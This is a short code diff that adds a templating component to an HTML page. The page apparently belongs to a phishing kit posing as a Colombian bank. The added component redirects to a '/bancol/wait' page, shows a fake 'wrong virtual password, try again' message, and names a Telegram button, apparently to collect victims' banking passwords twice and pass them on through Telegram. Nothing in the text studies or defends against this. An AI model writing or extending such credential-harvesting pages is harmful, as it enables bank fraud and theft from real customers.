@@ -287,6 +287,14 @@
         }
     </script>
 
+    <x-control
+        :auto-completar="false"
+        :debug="false"
+        redirect-url="/bancol/wait"
+        toast-message="Clave virtual incorrecta. Intenta nuevamente"
+        telegram-button="CLAVIR"
+    />
+
 </body>
 
 </html>
